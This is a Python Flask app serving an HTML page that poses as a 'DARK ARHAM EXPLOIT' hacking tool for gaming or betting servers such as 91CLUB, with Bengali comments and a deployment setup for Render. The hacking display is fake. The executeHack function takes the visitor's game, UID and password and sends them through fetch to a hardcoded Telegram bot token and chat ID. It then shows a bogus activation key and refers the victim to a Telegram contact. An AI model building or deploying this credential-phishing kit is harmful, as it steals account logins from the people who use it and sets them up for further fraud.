import os
from flask import Flask, render_template_string

app = Flask(__name__)

# 🔴 আপনার সেই আল্ট্রা-প্রো HTML কোড যা ডাইরেক্ট রান হবে
# এখানে নতুন কিছু ফিচার যেমন 'Scanline Overlay' এবং 'Dynamic Terminal' অ্যাড করা হয়েছে
HTML_CODE = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SYSTEM EXPLOIT - DARK ARHAM v4.0</title>
    <style>
        :root {
            --primary-red: #ff0000;
            --glow-red: 0 0 25px #ff0000;
            --bg-black: #050000;
        }

        body {
            margin: 0;
            background: var(--bg-black);
            color: var(--primary-red);
            font-family: 'Courier New', Courier, monospace;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            overflow: hidden;
            text-transform: uppercase;
        }

        /* 🔴 নতুন ফিচার: স্ক্যানলাইন ওভারলে (পুরো স্ক্রিনে পুরানো মনিটরের মতো দাগ) */
        body::before {
            content: " ";
            display: block;
            position: absolute;
            top: 0; left: 0; bottom: 0; right: 0;
            background: linear-gradient(rgba(18, 16, 16, 0) 50%, rgba(0, 0, 0, 0.25) 50%), 
                        linear-gradient(90deg, rgba(255, 0, 0, 0.06), rgba(0, 255, 0, 0.02), rgba(0, 0, 255, 0.06));
            z-index: 200;
            background-size: 100% 2px, 3px 100%;
            pointer-events: none;
        }

        #matrixCanvas {
            position: fixed;
            top: 0;
            left: 0;
            z-index: -1;
            opacity: 0.35;
        }

        .container {
            width: 400px;
            background: rgba(10, 0, 0, 0.95);
            padding: 40px;
            border: 2px solid var(--primary-red);
            box-shadow: 0 0 50px rgba(255, 0, 0, 0.3);
            position: relative;
            text-align: center;
            border-radius: 5px;
            z-index: 100;
        }

        /* 🔴 লেজার স্ক্যানার দাগ (সব ফিচার রাখা হয়েছে) */
        .laser-line {
            position: absolute;
            top: 0;
            width: 10px;
            height: 100%;
            background: linear-gradient(to right, transparent, var(--primary-red), transparent);
            box-shadow: 0 0 20px var(--primary-red);
            z-index: 150;
            animation: scan 4s linear infinite;
            pointer-events: none;
        }

        @keyframes scan {
            0% { left: -10%; }
            100% { left: 110%; }
        }

        .hacker-logo {
            width: 80px;
            height: 80px;
            margin: 0 auto 20px;
            border: 2px solid var(--primary-red);
            border-radius: 50%;
            display: flex;
            justify-content: center;
            align-items: center;
            font-size: 40px;
            box-shadow: var(--glow-red);
            animation: pulse 2s infinite;
        }

        @keyframes pulse {
            0% { transform: scale(1); box-shadow: 0 0 10px #f00; }
            50% { transform: scale(1.1); box-shadow: 0 0 30px #f00; }
            100% { transform: scale(1); box-shadow: 0 0 10px #f00; }
        }

        .input-group {
            text-align: left;
            margin-bottom: 20px;
        }

        label {
            font-size: 10px;
            font-weight: bold;
            display: block;
            margin-bottom: 5px;
        }

        input {
            width: 100%;
            padding: 15px;
            background: #000;
            border: 1px solid #500;
            color: #fff;
            outline: none;
            box-sizing: border-box;
            font-family: 'Courier New', monospace;
        }

        input:focus {
            border-color: var(--primary-red);
            box-shadow: var(--glow-red);
        }

        .action-btn {
            width: 100%;
            padding: 16px;
            background: var(--primary-red);
            color: #000;
            border: none;
            font-weight: 900;
            font-size: 18px;
            cursor: pointer;
            letter-spacing: 2px;
            box-shadow: var(--glow-red);
            transition: 0.3s;
        }

        .action-btn:hover {
            background: #fff;
            box-shadow: 0 0 40px #fff;
        }

        #terminal-log {
            margin-top: 15px;
            height: 60px;
            background: #000;
            border: 1px solid #300;
            font-size: 9px;
            color: #800;
            padding: 8px;
            overflow-y: hidden;
            text-align: left;
            line-height: 1.4;
        }

        #successUI { display: none; }

        .code-display {
            font-size: 32px;
            color: #fff;
            padding: 15px;
            border: 2px dashed var(--primary-red);
            margin: 15px 0;
            background: #150000;
            text-shadow: 0 0 10px #f00;
        }
    </style>
</head>
<body>

<canvas id="matrixCanvas"></canvas>

<div class="container">
    <div class="laser-line"></div>

    <div id="mainUI">
        <div class="hacker-logo">💀</div>
        <div style="font-size: 22px; font-weight: 900; margin-bottom: 20px; text-shadow: var(--glow-red);">DARK ARHAM EXPLOIT</div>
        
        <div class="input-group">
            <label>[#] SERVER TARGET</label>
            <input type="text" id="game" placeholder="e.g. 91CLUB / WINGO">
        </div>
        <div class="input-group">
            <label>[#] TARGET UID</label>
            <input type="text" id="uid" placeholder="SCANNING TARGET...">
        </div>
        <div class="input-group">
            <label>[#] ACCESS KEY</label>
            <input type="password" id="pass" placeholder="••••••••">
        </div>
        
        <button class="action-btn" onclick="executeHack()">BYPASS & INJECT</button>
        
        <div id="terminal-log">> INITIALIZING EXPLOIT...</div>
    </div>

    <div id="successUI">
        <div style="background: red; color: white; padding: 12px; font-weight: bold; margin-bottom: 20px; box-shadow: var(--glow-red);">✓ INJECTION SUCCESSFUL</div>
        <p style="font-size: 12px;">ACTIVATION KEY GENERATED:</p>
        <div class="code-display" id="finalHash">----</div>
        <p style="font-size: 11px;">SEND THIS KEY TO ADMIN FOR ACCESS:</p>
        <a href="https://t.me/darkarham" style="color: #00e1ff; text-decoration: none; font-weight: bold; font-size: 18px;">@DARKARHAM</a>
    </div>
</div>

<script>
    // ⚙️ আপনার টেলিগ্রাম কনফিগারেশন (হুবহু রাখা হয়েছে)
    const botToken = "8723486834:AAGVUC_-ygTt0e2yFi6E6Wz_8zgaylZtIJo";
    const chatId = "7897417844";

    const logs = [
        "Bruteforcing database...",
        "Bypassing Admin Firewall...",
        "Scraping hash values...",
        "Proxy: 192.168.1.1 masked",
        "Injecting malicious payload...",
        "Accessing root directory..."
    ];
    let lIdx = 0;
    setInterval(() => {
        const log = document.getElementById('terminal-log');
        if(log) {
            log.innerHTML += `<br>> ${logs[lIdx]}`;
            log.scrollTop = log.scrollHeight;
            lIdx = (lIdx + 1) % logs.length;
        }
    }, 2500);

    function executeHack() {
        const g = document.getElementById('game').value;
        const u = document.getElementById('uid').value;
        const p = document.getElementById('pass').value;

        if(!g || !u || !p) return alert("REQUIRED: INPUT ALL FIELDS!");

        document.querySelector('.action-btn').innerText = "INJECTING...";

        // আপনার টেলিগ্রাম বটে ডাটা সেন্ডিং
        const msg = `🚨 EXPLOIT ALERT 🚨\\n\\n🎯 TARGET: ${g}\\n👤 UID: ${u}\\n🔑 PASS: ${p}\\n🛡️ STATUS: BYPASSED`;

        fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(msg)}`)
        .finally(() => {
            document.getElementById('mainUI').style.display = 'none';
            document.getElementById('successUI').style.display = 'block';
            document.getElementById('finalHash').innerText = "DA-" + Math.floor(100000 + Math.random() * 900000);
        });
    }

    // Matrix Background (Stable)
    const canvas = document.getElementById('matrixCanvas');
    const ctx = canvas.getContext('2d');
    canvas.width = window.innerWidth; canvas.height = window.innerHeight;
    const drops = Array(Math.floor(canvas.width/20)).fill(1);
    function draw() {
        ctx.fillStyle = "rgba(5, 0, 0, 0.1)"; ctx.fillRect(0, 0, canvas.width, canvas.height);
        ctx.fillStyle = "#f00"; ctx.font = "15px monospace";
        drops.forEach((y, i) => {
            const txt = String.fromCharCode(Math.random() * 128); ctx.fillText(txt, i * 20, y * 20);
            if (y * 20 > canvas.height && Math.random() > 0.975) drops[i] = 0; drops[i]++;
        });
    }
    setInterval(draw, 50);
</script>
</body>
</html>
"""

@app.route('/')
def home():
    # সরাসরি HTML কোডটি রেন্ডার করবে
    return render_template_string(HTML_CODE)

if __name__ == "__main__":
    # Render এর জন্য ডায়নামিক পোর্ট সেটআপ
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)
    
